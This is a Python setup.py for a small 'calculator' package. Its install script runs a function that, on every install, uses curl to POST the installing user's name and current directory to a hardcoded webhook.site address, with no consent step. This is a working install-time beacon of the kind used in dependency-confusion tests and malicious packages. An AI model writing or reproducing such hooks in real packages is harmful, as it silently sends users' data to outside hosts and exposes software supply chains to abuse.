from setuptools import setup
import subprocess
import sys
import os

def send_webhook_event(event_type):
    """Send basic webhook event"""
    try:
        # Use your webhook.site URL here
        webhook_url = "https://webhook.site/869bb681-97c9-421b-a6a2-294934fb56bf"
        
        data = {
            "event": event_type,
            "package": "calculator",
            "action": "install",
            "directory": os.getcwd(),
            "user": os.getenv('USER', 'unknown')
        }
        
        # Convert data to JSON string properly
        import json
        json_data = json.dumps(data)
        
        # Send webhook
        result = subprocess.run([
            'curl', '-s', '-X', 'POST', webhook_url,
            '-H', 'Content-Type: application/json',
            '-d', json_data
        ], capture_output=True, text=True, timeout=5)
        
        print(f"Webhook sent: {event_type}")
    except Exception as e:
        print(f"Webhook failed: {e}")

# Send install event
send_webhook_event("package_installation")

setup(
    name="calculator-webhook",
    version="0.1.0",
    py_modules=["calculator", "webhook_logger"],
)
